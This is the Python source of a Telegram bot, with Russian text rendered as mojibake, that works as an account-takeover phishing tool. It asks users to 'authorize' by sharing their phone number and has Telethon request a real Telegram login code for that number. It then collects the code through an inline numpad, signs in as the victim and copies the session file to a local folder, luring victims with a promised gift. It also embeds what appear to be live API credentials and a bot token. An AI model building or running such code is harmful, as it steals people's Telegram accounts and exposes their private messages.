import os
import shutil
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, CallbackContext
from telethon import TelegramClient
from telethon.errors import PhoneCodeInvalidError

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telethon
API_ID = '13791466'  # –í–∞—à API ID
API_HASH = '1bc244c0ba8389b1d0bf44b975cbbee4'  # –í–∞—à API Hash
BOT_TOKEN = '7560944606:AAFcOM4y-wY7C-VfaMAaLc5Y-ZgZnmW76Lg'  # –¢–æ–∫–µ–Ω –≤–∞—à–µ–≥–æ –±–æ—Ç–∞

# –°–æ—Å—Ç–æ—è–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
user_state = {}
CODE_TIMEOUT = 600  # –¢–∞–π–º-–∞—É—Ç –æ–∂–∏–¥–∞–Ω–∏—è –∫–æ–¥–∞ (10 –º–∏–Ω—É—Ç)

# –°–æ–∑–¥–∞–Ω–∏–µ inline-–∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
def create_numpad(code_input):
    keyboard = [
        [InlineKeyboardButton("1", callback_data="1"), InlineKeyboardButton("2", callback_data="2"), InlineKeyboardButton("3", callback_data="3")],
        [InlineKeyboardButton("4", callback_data="4"), InlineKeyboardButton("5", callback_data="5"), InlineKeyboardButton("6", callback_data="6")],
        [InlineKeyboardButton("7", callback_data="7"), InlineKeyboardButton("8", callback_data="8"), InlineKeyboardButton("9", callback_data="9")],
        [InlineKeyboardButton("–£–¥–∞–ª–∏—Ç—å", callback_data="delete"), InlineKeyboardButton("0", callback_data="0"), InlineKeyboardButton("–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", callback_data="confirm")]
    ]
    message = f"–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥: {code_input}" if code_input else "–í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥, –∏—Å–ø–æ–ª—å–∑—É—è –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ."
    return keyboard, message

# –ö–æ–º–∞–Ω–¥–∞ /start
async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_state[user_id] = {
        "contact_received": False,
        "code_input": "",
    }
    keyboard = [[KeyboardButton("–ê–í–¢–û–†–ò–ó–û–í–ê–¢–¨–°–Ø ‚úÖ", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "‚ùóÔ∏è–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø—Ä–æ–π—Ç–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é. –≠—Ç–æ –Ω—É–∂–Ω–æ –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –º—ã –º–æ–≥–ª–∏ –∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –≤–∞—à –ø—Ä–æ—Ñ–∏–ª—å –¥–ª—è –±–æ–ª–µ–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç–∞! ‚è≥ –≠—Ç–æ –∑–∞–π–º—ë—Ç –Ω–µ –±–æ–ª–µ–µ –º–∏–Ω—É—Ç—ã! –°–¥–µ–ª–∞—Ç—å —ç—Ç–æ –º–æ–∂–Ω–æ —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ –≤–Ω–∏–∑—É üëá",
        reply_markup=reply_markup
    )

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–Ω—Ç–∞–∫—Ç–∞
async def handle_contact(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    contact = update.message.contact
    phone_number = contact.phone_number
    username = update.effective_user.username  # –ü–æ–ª—É—á–∞–µ–º username –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

    # –£–¥–∞–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–Ω—Ç–∞–∫—Ç–æ–º
    await update.message.delete()

    # –£–¥–∞–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –±–æ—Ç–∞ —Å –ø—Ä–æ—Å—å–±–æ–π –æ–± –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏, –µ—Å–ª–∏ –æ–Ω–æ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
    if "auth_message" in user_state.get(user_id, {}):
        try:
            await context.bot.delete_message(chat_id=user_id, message_id=user_state[user_id]["auth_message"])
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: {e}")

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∫–æ–Ω—Ç–∞–∫—Ç
    user_state[user_id] = {
        "phone_number": phone_number,
        "contact_received": True,
        "code_input": "",
        "last_request_time": datetime.now(),
    }

    # –£–±–∏—Ä–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –∏ —É–≤–µ–¥–æ–º–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    await update.message.reply_text("–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –≤–∞–º –∫–æ–¥ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏! üöÄ", reply_markup=ReplyKeyboardRemove())

    # –í—ã–≤–æ–¥–∏–º ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, username –∏ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ –∫–æ–Ω—Å–æ–ª—å
    print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ID: {user_id}, Username: @{username if username else '–ù–µ—Ç username'}, –¢–µ–ª–µ—Ñ–æ–Ω: {phone_number}")

    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –≤—Ö–æ–¥ –≤ Telegram
    await request_code_telegram(user_id, phone_number, context)

# –ó–∞–ø—Ä–æ—Å –∫–æ–¥–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —á–µ—Ä–µ–∑ Telethon
async def request_code_telegram(user_id, phone_number, context):
    try:
        client = TelegramClient(f"session_{user_id}", API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone=phone_number)
        user_state[user_id]["client"] = client

        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º inline-–∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞
        keyboard, message = create_numpad("")
        await context.bot.send_message(
            chat_id=user_id,
            text=message,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –∫–æ–¥–∞: {e}")
        await context.bot.send_message(chat_id=user_id, text="–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –∫–æ–¥–∞. –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –ø–æ–∑–∂–µ.")

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞–∂–∞—Ç–∏–π inline-–∫–Ω–æ–ø–æ–∫
async def handle_button(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    user_data = user_state.get(user_id, {})
    code_input = user_data.get("code_input", "")

    if query.data.isdigit():  # –ï—Å–ª–∏ –Ω–∞–∂–∞—Ç–∞ —Ü–∏—Ñ—Ä–∞
        if len(code_input) < 5:
            code_input += query.data
    elif query.data == "delete":  # –£–¥–∞–ª–∏—Ç—å –ø–æ—Å–ª–µ–¥–Ω–∏–π —Å–∏–º–≤–æ–ª
        code_input = code_input[:-1]
    elif query.data == "confirm":  # –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤–≤–æ–¥
        if len(code_input) == 5:
            await query.edit_message_text("–ü—Ä–æ–≤–µ—Ä—è—é –∫–æ–¥. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...")
            await login_telegram(user_id, code_input, query)
            return
        else:
            await query.answer("–ö–æ–¥ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å 5-–∑–Ω–∞—á–Ω—ã–º.")
            return

    # –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    user_state[user_id]["code_input"] = code_input
    keyboard, message = create_numpad(code_input)
    await query.edit_message_text(text=message, reply_markup=InlineKeyboardMarkup(keyboard))

# –í—Ö–æ–¥ –≤ Telegram —á–µ—Ä–µ–∑ Telethon
async def login_telegram(user_id, code, query):
    user_data = user_state.get(user_id, {})
    client = user_data.get("client")
    phone_number = user_data.get("phone_number")
    session_file = f"session_{user_id}.session"
    target_folder = r"D:\Sessions"

    try:
        await client.sign_in(phone=phone_number, code=code)
        user_state[user_id]["login_successful"] = True
        await query.edit_message_text("–í—ã —É—Å–ø–µ—à–Ω–æ –∞–≤—Ç–æ—Ä–∏–∑–∏—Ä–æ–≤–∞–ª–∏—Å—å! ‚úÖ –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥–∞—Ä–æ–∫ –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤.")

        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–µ—Å—Å–∏—é
        await client.disconnect()
        if not os.path.exists(target_folder):
            os.makedirs(target_folder)
        shutil.copy(session_file, target_folder)
        print(f"–°–µ—Å—Å–∏—è {session_file} —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞ –≤ {target_folder}.")
    except PhoneCodeInvalidError:
        await query.edit_message_text("–ö–æ–¥ –Ω–µ–≤–µ—Ä–Ω—ã–π. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")
        user_state[user_id]["code_input"] = ""
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞: {e}")
        await query.edit_message_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")

# –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(CallbackQueryHandler(handle_button))

    print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω...")
    app.run_polling()

if __name__ == "__main__":
    main()
